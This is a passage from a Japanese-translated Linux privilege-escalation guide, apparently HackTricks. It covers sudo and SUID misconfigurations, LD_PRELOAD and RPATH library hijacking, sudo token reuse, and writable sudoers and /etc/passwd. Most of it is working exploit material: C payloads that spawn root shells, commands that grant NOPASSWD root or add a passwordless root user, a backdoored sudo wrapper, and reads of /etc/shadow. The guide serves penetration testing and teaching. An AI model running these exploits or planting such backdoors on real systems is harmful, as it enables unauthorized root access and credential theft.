一部のLinuxバージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root権限を与える可能性のある**いずれかのグループのメンバー**かどうかを確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボード内に興味深い情報が含まれていないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワードを知っている**場合は、そのパスワードを使って**各ユーザーにログインしてみてください**。

### Su Brute

多くのノイズを出すのを気にせず、かつコンピュータに `su` と `timeout` のバイナリが存在する場合、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをbrute-forceしてみてください.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーのbrute-forceも試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし $PATH のいずれかのフォルダに**書き込みできる**ことが分かれば、書き込み可能なフォルダ内に、別のユーザー（理想的には root）が実行するコマンド名と同じ名前のバックドアを**作成することで**権限を昇格できる可能性があります。ただし、そのコマンドが $PATH 内であなたの書き込み可能フォルダより前にある別のフォルダから**読み込まれない**ことが条件です。

### SUDO and SUID

sudoでコマンドを実行できるようになっている、またはsuidビットが付与されている可能性があります。以下で確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドはファイルの読み取りおよび/または書き込み、あるいはコマンドの実行を可能にします。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーはパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` 権限で `vim` を実行できるため、root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブにより、ユーザーは何かを実行する際に **環境変数を設定する** ことができます:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer に基づく**、**脆弱**で**PYTHONPATH hijacking**により、スクリプトをrootとして実行する際に任意の python ライブラリをロードできるものでした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持される → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- なぜ機能するか: 非対話シェルでは Bash は `$BASH_ENV` を評価し、そのファイルを source してからターゲットスクリプトを実行します。多くの sudo ルールでスクリプトやシェルラッパの実行が許可されています。`BASH_ENV` が sudo によって保持されていれば、あなたのファイルは root 権限で source されます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出す任意のターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を推奨する。
- sudo で許可されたコマンド用のシェルラッパーを避け、最小限のバイナリを使用する。
- 保存された環境変数が使用された場合の sudo の I/O ログ記録とアラートを検討する。

### sudo 実行のバイパス経路

**Jump** して他のファイルを読むか、**symlinks** を使用する。例えば sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使われている場合（\*）、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary（コマンドのパスが指定されていない場合）

もし特定のコマンドに対して **sudo permission** が与えられ、**パスを指定していない** 場合: _hacker10 ALL= (root) less_。PATH 変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** binary が**コマンドのパスを指定せずに別のコマンドを実行する場合（不審な SUID binary の内容は常に** _**strings**_ **で確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary がコマンドのパスを指定している場合

もし**suid** binary が**パスを指定して別のコマンドを実行する**場合、suid file が呼び出しているコマンド名で**export a function**を試すことができます。

例えば、suid binary が _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成して export してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
次に、suid バイナリを呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

しかし、この機能が特に **suid/sgid** 実行ファイルで悪用されるのを防ぎ、システムのセキュリティを維持するために、システムはいくつかの条件を強制します:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
次の名前で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**それをコンパイルします**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges**を実行する
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様の privesc は、攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合に悪用できる。なぜなら、ライブラリが検索されるパスを攻撃者が制御できるからだ。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる **SUID** パーミッションを持つ binary に遭遇した場合、正しく **.so** ファイルを読み込んでいるか確認するのが良い習慣です。これは次のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーが発生した場合、悪用の可能性が示唆されます。

これを悪用するには、_"/path/to/.config/libcalc.c"_ のような C ファイルを作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルの権限を操作し、昇格した権限で shell を起動することで権限を昇格させることを目的としています。

上記の C file を共有オブジェクト (.so) ファイルにコンパイルするには、次のようにします:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary が folder から library をロードしており、そこに write できることが分かったので、その folder に必要な名前の library を作成します:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
これは、生成したライブラリに `a_function_name` という名前の関数が必要であることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリを集めたキュレーションリストです。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに**引数だけを注入できる**場合に焦点を当てています。

このプロジェクトは、Unix バイナリの正規機能を収集しており、restricted shells からの脱出、権限の昇格・維持、ファイル転送、bind and reverse shells の生成、その他の post-exploitation タスクを容易にするために悪用できます。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

もし `sudo -l` にアクセスできるなら、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、sudo のルールを悪用する方法を見つけられるかどうかを確認できます。

### Sudoトークンの再利用

パスワードがないが **sudo access** を持っている場合、**sudo コマンドの実行を待ち、そのセッショントークンをハイジャックする**ことで権限を昇格できます。

権限昇格の要件:

- 既にユーザー _sampleuser_ として shell を持っている
- _sampleuser_ が **過去15分以内に `sudo` を使って** 何かを実行している（デフォルトではこれが、パスワード入力なしで `sudo` を使えるトークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` にアクセスできること（アップロード可能であること）

(一時的に `ptrace_scope` を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に修正して `kernel.yama.ptrace_scope = 0` を設定します)

上記の要件を満たしていれば、**次を使用して権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初のエクスプロイト**（`exploit.sh`）はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って **セッション内の sudo トークンを有効化** できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid が設定された** sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成する** ことで、**sudo tokens を永続化し、すべてのユーザが sudo を使用できるようにする**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダまたはそのフォルダ内に作成されたファイルのいずれかに対して**write permissions**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して**ユーザーと PID のための sudo token を作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザー（PID 1234）としてシェルを持っている場合、パスワードを知らなくても **obtain sudo privileges** できます。次のように:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかとその方法を設定します。**これらのファイルはデフォルトでユーザー root とグループ root のみが読み取れます**。\
**もし**このファイルを**読み取る**ことができれば、**興味深い情報を取得できる**可能性があり、かつ任意のファイルに**書き込める**のであれば**権限昇格**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができるなら、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として OpenBSD の `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし、**ユーザーが通常マシンに接続して `sudo` を使って権限を昇格する**ことが分かっており、かつそのユーザーコンテキストでシェルを取得している場合、rootとしてあなたのコードを実行し、その後ユーザーのコマンドを実行する**新しい sudo 実行ファイルを作成**できます。次に、ユーザーコンテキストの**$PATH を変更**（例えば新しいパスを .bash_profile に追加する）して、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback)は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) で確認できます。

あるいは次のように実行する：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれる設定ファイルがどこから来るか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは **ライブラリが検索される他のフォルダ** を指しています。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内でライブラリを検索します**。

何らかの理由で指定されたパス: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に記載されている設定ファイル内の任意のフォルダに **ユーザーが書き込み権限を持っている** 場合、権限昇格できる可能性があります.\

以下のページで、このミスコンフィギュレーションを**どのように悪用するか** を確認してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されたこの場所の lib がプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に `/var/tmp` に悪意のあるライブラリを作成するには、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使用します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## キャパビリティ

Linux capabilities はプロセスに対して利用可能な root privileges の**サブセットを提供します**。これは実質的に root の**特権をより小さく識別可能な単位に分割する**ことを意味します。これらの各単位は個別にプロセスに付与でき、その結果として特権の全体セットが縮小され、悪用のリスクが低減します。\
capabilities やそれを悪用する方法について詳しくは次のページを参照してください：


{{#ref}}
linux-capabilities.md
{{#endref}}

## ディレクトリ権限

ディレクトリでは、**"execute" ビット**は対象ユーザーが "**cd**" してフォルダに入れることを意味します。\
**"read"** ビットはユーザーが**ファイルを一覧表示(list)**できることを意味し、**"write"** ビットはユーザーが**ファイルを削除(delete)**および**作成(create)**できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の二次レイヤーを表し、伝統的な ugo/rwx 権限を**上書きできる**機能を持ちます。これらの権限はオーナーやグループに属さない特定のユーザーに対してアクセスを許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**粒度によりより厳密なアクセス管理が可能**になります。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**付与する** ユーザー "kali" にファイルの読み取りおよび書き込み権限を与える：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定の ACLs を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

In **old versions** you may **hijack** some **shell** session of a different user (**root**).\
In **newest versions** you will be able to **connect** to screen sessions only of **your own user**. However, you could find **interesting information inside the session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッションのハイジャック

これは **古い tmux バージョン** の問題でした。権限のないユーザーとして、root によって作成された tmux (v2.1) セッションをハイジャックできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーはこのバグの影響を受ける可能性があります。\
このバグはそれらのOSで新しい ssh キーを作成したときに発生します。**わずか32,768通りのバリエーションしか存在しませんでした**。つまり全ての可能性を計算でき、**sshの公開鍵を持っていれば対応する秘密鍵を検索できます**。計算済みの候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、パスワードが空文字のアカウントでのログインをサーバーが許可するかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh でログインできるかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵のみでログインできます
- `forced-commands-only`: root は秘密鍵のみでログインでき、command オプションが指定されている場合に限ります
- `no`: 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、ユーザーのホームディレクトリに置き換えられます。**絶対パスを指定できます**（`/` で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の **private** key でログインしようとした場合、ssh があなたの public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にある鍵と比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（without passphrases!）鍵を置いたままにする代わりに、**use your local SSH keys instead of leaving keys** が利用できるようになります。つまり、ssh 経由で **jump** **to a host** し、そこから **jump to another** host を **using** the **key** located in your **initial host** という形で接続できます。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **上書き** this **オプション** and allow or denied this configuration.\
The file `/etc/sshd_config` can **許可** or **拒否** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **権限昇格に悪用できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

The file `/etc/profile` and the files under `/etc/profile.d/` are **ユーザーが新しいシェルを実行したときに実行されるスクリプト**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
もし怪しいプロファイルスクリプトが見つかったら、**機密情報**がないか確認してください。

### Passwd/Shadow ファイル

OSによっては、`/etc/passwd` と `/etc/shadow` ファイルが別名だったりバックアップが存在することがあります。したがって、**それらをすべて見つける** と **読み取れるか確認する** ことをお勧めします。ファイル内に **ハッシュが含まれているか** を確認してください:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に **password hashes** が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次にユーザー `hacker` を追加し、生成されたパスワードを設定します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを `hacker:hacker` で使用できます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティを低下させる可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**いくつかの機密ファイルに書き込みできるか**を確認すべきです。例えば、**サービスの設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバを実行していて、**modify the Tomcat service configuration file inside /etc/systemd/,** が可能なら、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### フォルダを確認

あなたの backdoor は、tomcat が次に起動したときに実行されます。

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。**パスワードを含んでいる可能性のある複数のファイル**を検索します。\
**もう1つの興味深いツール**として利用できるのが: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows, Linux & Mac のローカルコンピュータに保存された多くのパスワードを取得するためのオープンソースのアプリケーションです。

### Logs

ログを読めるなら、そこから**興味深い／機密情報**を見つけられるかもしれません。ログが奇妙であればあるほど、より興味深い（かもしれません）。\
また、一部の**誤設定された**（バックドア化されている？）**audit logs**は、audit logs内に**パスワードを記録する**ことを可能にする場合があります。詳細はこの投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイルの**名前**や**内容**に単語 "**password**" を含むもの、そしてログ内の IPs や emails、hashes regexps も確認してください。ここでこれらをすべて行う方法を列挙するつもりはありませんが、興味がある場合は [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

